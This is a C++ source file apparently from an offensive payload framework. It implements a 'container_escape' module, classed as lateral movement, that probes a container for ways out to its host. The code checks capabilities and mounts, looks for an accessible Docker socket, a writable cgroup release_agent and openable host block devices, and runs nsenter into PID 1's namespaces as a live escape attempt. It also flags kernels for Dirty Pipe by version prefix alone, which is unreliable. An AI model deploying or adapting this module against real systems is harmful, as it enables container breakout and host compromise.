#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include <cctype>
#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

std::vector<std::string> split_nl(const std::string& s) {
    std::vector<std::string> out;
    size_t start = 0;
    for (;;) {
        size_t pos = s.find('\n', start);
        if (pos == std::string::npos) {
            out.push_back(s.substr(start));
            break;
        }
        out.push_back(s.substr(start, pos - start));
        start = pos + 1;
    }
    return out;
}

struct EscapeMethod {
    std::string name;
    bool success = false;
    std::string detail;
};

OJ method_json(const EscapeMethod& m) {
    OJ o = OJ::object();
    o["name"] = m.name;
    o["success"] = m.success;
    o["detail"] = m.detail;
    return o;
}

OJ check_container_privs() {
    OJ p = OJ::object();
    p["is_root"] = (::geteuid() == 0);

    std::string status;
    if (read_file("/proc/self/status", status)) {
        for (const auto& line : split_nl(status)) {
            if (line.rfind("CapEff:", 0) == 0) {
                std::string cap = trim(line.substr(7));
                p["capabilities"] = cap;
                p["privileged"] = cap.find("0000003fffffffff") != std::string::npos;
            }
        }
    }

    CmdResult mo = run_cmd_out({"mount"});
    if (mo.ok) {
        std::vector<std::string> lines = split_nl(mo.out);
        std::vector<std::string> sensitive;
        for (const char* marker : {"/proc", "/sys", "/dev", "/var/run/docker.sock"}) {
            for (const auto& line : lines) {
                if (line.find(marker) != std::string::npos) {
                    sensitive.push_back(marker);
                    break;
                }
            }
        }
        if (sensitive.empty())
            p["sensitive_mounts"] = nullptr;
        else
            p["sensitive_mounts"] = sensitive;
        size_t n = lines.size() < 10 ? lines.size() : 10;
        std::vector<std::string> head(lines.begin(), lines.begin() + (long)n);
        p["mounts"] = head;
    }
    return p;
}

EscapeMethod try_docker_socket() {
    EscapeMethod m;
    m.name = "docker_socket";
    const std::string sock = "/var/run/docker.sock";
    struct stat st;
    if (::stat(sock.c_str(), &st) != 0) {
        if (errno == ENOENT) m.detail = "No docker socket";
        else m.detail = "Docker socket exists but not accessible";
        return m;
    }
    if (S_ISSOCK(st.st_mode)) {
        m.success = true;
        m.detail = "Docker socket accessible";
    } else {
        m.detail = "Docker socket exists but not accessible";
    }
    return m;
}

EscapeMethod try_cgroup_release() {
    EscapeMethod m;
    m.name = "cgroup_release_agent";
    const char* const paths[] = {"/sys/fs/cgroup/release_agent", "/sys/fs/cgroup/*/release_agent"};
    for (const char* pattern : paths) {
        std::string p = pattern;
        if (p.find('*') != std::string::npos) {
            CmdResult out = run_cmd_out({"sh", "-c", "ls " + p + " 2>/dev/null"});
            for (const auto& raw : split_nl(out.out)) {
                std::string cand = trim(raw);
                if (cand.empty()) continue;
                struct stat st;
                if (::stat(cand.c_str(), &st) == 0 && (st.st_mode & 0002) != 0) {
                    m.success = true;
                    m.detail = "Writable release_agent: " + cand;
                    return m;
                }
            }
        } else {
            struct stat st;
            if (::stat(p.c_str(), &st) == 0 && (st.st_mode & 0002) != 0) {
                m.success = true;
                m.detail = "Writable release_agent: " + p;
                return m;
            }
        }
    }
    m.detail = "No writable release_agent found";
    return m;
}

EscapeMethod try_device_access() {
    EscapeMethod m;
    m.name = "device_access";
    std::vector<std::string> accessible;
    for (const char* dev : {"sda", "nvme0n1", "dm-0", "loop0"}) {
        std::string path = std::string("/dev/") + dev;
        struct stat st;
        if (::stat(path.c_str(), &st) == 0 && (S_ISBLK(st.st_mode) || S_ISCHR(st.st_mode))) {
            int fd = ::open(path.c_str(), O_RDONLY);
            if (fd >= 0) {
                ::close(fd);
                accessible.push_back(dev);
            }
        }
    }
    if (!accessible.empty()) {
        m.success = true;
        m.detail = "Accessible devices: ";
        for (size_t i = 0; i < accessible.size(); ++i) {
            if (i > 0) m.detail += ", ";
            m.detail += accessible[i];
        }
    } else {
        m.detail = "No accessible host devices";
    }
    return m;
}

EscapeMethod try_nsenter() {
    EscapeMethod m;
    m.name = "nsenter";
    if (which_exe("nsenter").empty()) {
        m.detail = "nsenter not found";
        return m;
    }
    CmdResult out = mut_run_argv_combined({"nsenter", "--target", "1", "--mount", "--uts",
                                           "--ipc", "--pid", "id"});
    std::string o = trim(out.out);
    if (out.ok && !o.empty()) {
        m.success = true;
        m.detail = "nsenter successful: " + o;
    } else {
        m.detail = "nsenter failed: " + out.err;
    }
    return m;
}

EscapeMethod try_mount_escape() {
    EscapeMethod m;
    m.name = "mount_escape";
    const std::string test_dir = "/tmp/.test_mount";
    mut_mkdir_p(test_dir, 0755);
    struct Cleanup {
        const std::string& dir;
        ~Cleanup() { mut_remove_all(dir); }
    } cleanup{test_dir};

    CmdResult r = mut_run_argv({"mount", "--bind", "/tmp", test_dir});
    if (r.ok) {
        m.success = true;
        m.detail = "Can create bind mounts";
        mut_run_argv({"umount", test_dir});
    } else {
        m.detail = "Cannot mount: " + r.err;
    }
    return m;
}

std::vector<std::string> check_kernel_vulns() {
    std::vector<std::string> vulns;
    CmdResult r = run_cmd_out({"uname", "-r"});
    std::string kernel = trim(r.out);
    static const char* const kBad[] = {"5.8",  "5.9",  "5.10", "5.11", "5.12",
                                       "5.13", "5.14", "5.15", "5.16"};
    for (const char* p : kBad) {
        if (kernel.rfind(p, 0) == 0) {
            vulns.push_back(std::string("CVE-2022-0847 (Dirty Pipe): ") + kernel);
            break;
        }
    }
    return vulns;
}

class ContainerEscape : public Payload {
  public:
    const char* name() const override { return "container_escape"; }
    const char* category() const override { return "lateral"; }
    const char* description() const override {
        return "Container escape techniques (privileged check, cgroup mount, nsenter)";
    }

    Output execute(const Args& args) const override {
        (void)args;
        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();

        OJ priv = check_container_privs();
        bool is_root = priv.value("is_root", false);
        bool privileged = priv.value("privileged", false);
        r["privileges"] = priv;

        std::vector<EscapeMethod> methods = {try_docker_socket(), try_cgroup_release(),
                                             try_device_access(), try_nsenter(),
                                             try_mount_escape()};

        std::vector<std::string> vulns = check_kernel_vulns();

        std::vector<std::string> recommendations;
        for (const auto& m : methods) {
            if (m.success) recommendations.push_back(m.name);
        }
        if (privileged) recommendations.push_back("privileged_container_escape");
        if (is_root) recommendations.push_back("root_escape_techniques");

        OJ arr = OJ::array();
        for (const auto& m : methods) arr.push_back(method_json(m));
        r["escape_methods"] = arr;
        if (vulns.empty())
            r["vulnerable_kernels"] = nullptr;
        else
            r["vulnerable_kernels"] = vulns;
        if (recommendations.empty())
            r["recommendations"] = nullptr;
        else
            r["recommendations"] = recommendations;

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

ContainerEscape g_container_escape;

struct Reg { Reg() { Register(&g_container_escape); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
